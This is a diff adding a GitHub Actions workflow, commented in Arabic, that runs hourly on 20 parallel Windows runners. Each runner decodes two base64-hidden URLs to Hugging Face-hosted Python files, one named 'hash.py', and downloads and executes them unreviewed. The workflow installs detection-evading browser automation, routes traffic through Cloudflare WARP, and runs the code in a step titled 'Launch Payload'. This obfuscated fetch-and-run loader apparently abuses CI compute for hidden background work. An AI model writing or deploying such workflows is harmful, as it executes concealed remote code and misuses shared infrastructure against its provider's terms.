@@ -1,0 +1,88 @@
+name: Background Task Automation
+
+on:
+  workflow_dispatch: # للتشغيل اليدوي
+  schedule:
+    - cron: '0 * * * *' # الجدولة للعمل كل ساعة تماماً على مدار الـ 24 ساعة
+
+# تحديد تشغيل واحد في نفس الوقت مع حد أقصى تشغيل واحد فقط في الانتظار
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+jobs:
+  execute-nodes:
+    name: Worker-Instance [${{ matrix.node_index }}]
+    runs-on: windows-2022
+    timeout-minutes: 75 # تم زيادة مدة الجلسة الكلية لتستوعب المدة براحة
+    
+    strategy:
+      fail-fast: false
+      matrix:
+        node_index: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20] # تشغيل 20 نسخة بالتوازي
+
+    steps:
+      # ---------------------------------------------------------
+      # الخطوة الأولى: تهيئة البيئة وتنزيل الملفات
+      # ---------------------------------------------------------
+      - name: Environment Setup & Script Download
+        shell: bash
+        run: |
+          echo ">>> [SYSTEM] Starting Node-${{ matrix.node_index }} setup..."
+          
+          # فك تشفير الروابط الجديدة وتحميلها في المتغيرات
+          URL_HASH=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9nZmRnMzRmc2Qvc2h2L3Jlc29sdmUvbWFpbi9oYXNoLnB5" | base64 --decode)
+          URL_MAIN=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9nZmRnMzRmc2Qvc2gzL3Jlc29sdmUvbWFpbi9zdGFydF9zaHJpbmtfbmV3LnB5" | base64 --decode)
+          
+          # حفظ الملفات (سيتم حفظ الملف الأساسي باسم start.py لتسهيل التشغيل)
+          curl -sL "$URL_HASH" > hash.py
+          curl -sL "$URL_MAIN" > start.py
+          
+          echo ">>> [SYSTEM] Installing Python modules..."
+          python -m pip install -qU pip setuptools
+          pip install -q undetected-chromedriver selenium requests
+          echo ">>> [SYSTEM] Ready to execute."
+
+      # ---------------------------------------------------------
+      # الخطوة الثانية: التشغيل الصامت مع نظام الحماية الزمني (1 ساعة وربع)
+      # ---------------------------------------------------------
+      - name: Launch Payload & Time Monitor
+        shell: pwsh
+        env:
+          PYTHONIOENCODING: "utf-8"
+        run: |
+          Write-Output "[INFO] Initiating start.py on Instance ${{ matrix.node_index }}..."
+          
+          # إضافة WARP لمسار النظام بطريقة مباشرة
+          $env:PATH = $env:PATH + ";C:\Program Files\Cloudflare\Cloudflare WARP"
+          
+          # تجهيز معطيات تشغيل العملية في الخلفية
+          $ProcessArgs = @{
+              FilePath = "python"
+              ArgumentList = "start.py"
+              PassThru = $true
+              NoNewWindow = $true
+          }
+          $activeProcess = Start-Process @ProcessArgs
+          
+          Write-Output "[MONITOR] Watchdog is running. Timeout limit: 74 mins."
+          
+          try {
+              # انتظار انتهاء العملية أو وصولها للحد الزمني (4440 ثانية = 74 دقيقة)
+              # نستخدم 74 دقيقة ليتمكن السكريبت من الإغلاق بسلاسة قبل انتهاء الـ 75 دقيقة
+              Wait-Process -InputObject $activeProcess -Timeout 4440 -ErrorAction Stop
+              Write-Output "[SUCCESS] Task completed within limits."
+          } 
+          catch {
+              # إيقاف إجباري عند تخطي 74 دقيقة 
+              Write-Output "[TIMEOUT] 74 minutes reached. Forcing process kill to transition..."
+              Stop-Process -InputObject $activeProcess -Force
+              Write-Output "[TERMINATED] Process closed gracefully by Watchdog after 1 Hour and 14 mins."
+          }
+
+      # ---------------------------------------------------------
+      # الخطوة الثالثة: إغلاق المهمة
+      # ---------------------------------------------------------
+      - name: Finalize
+        shell: bash
+        run: echo "<<< [SYSTEM] Worker-${{ matrix.node_index }} finished its lifecycle."
